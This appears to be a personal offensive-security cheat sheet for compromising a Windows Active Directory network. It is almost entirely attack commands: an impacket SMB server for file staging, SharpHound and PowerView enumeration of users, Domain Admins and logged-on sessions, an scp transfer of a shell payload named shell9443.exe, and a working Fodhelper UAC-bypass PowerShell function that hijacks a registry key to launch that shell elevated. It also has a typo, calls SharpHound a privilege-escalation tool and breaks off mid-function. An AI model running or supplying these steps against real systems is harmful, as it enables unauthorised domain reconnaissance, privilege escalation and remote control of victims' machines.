python /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username user -password password

- use SharpHound.ps1 to elevate privileges on the victim workstation.
Import-Module .\SharpHound.ps1
Invole-BloodHound -CollectionMethod All

Get-NetUser | select cn, objectsid
Get-NetUser | select cn, objectsid, adspath

Get-Netgroup -AdminCount

Get-netGroup -username admin2

Get-netgroupMember -groupName "Domain Admins"

Get-NetDomain
Get-DomainSID
Get-DomainPolicy
Get-NetDomainController

Invoke-EnumerateLocalAdmin

Get-NetLoggedon -ComputerName Domain-Controller.controller.local
Invoke-ShareFinder

python /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username user -password password

#transfer file down from Linux Kali to another system
scp root@10.211.55.6:/root/youtube/uac/shell9443.exe

#Privilege escalation - Windows
https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
function FodhelperBypass(){ 
 Param (
           
        [String]$program = "cmd /c start powershell.exe" #default
       )
#Create registry structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\users\Attila Kun\Downloads\shell9443.exe" -Force






#Getting started with Bloodhound









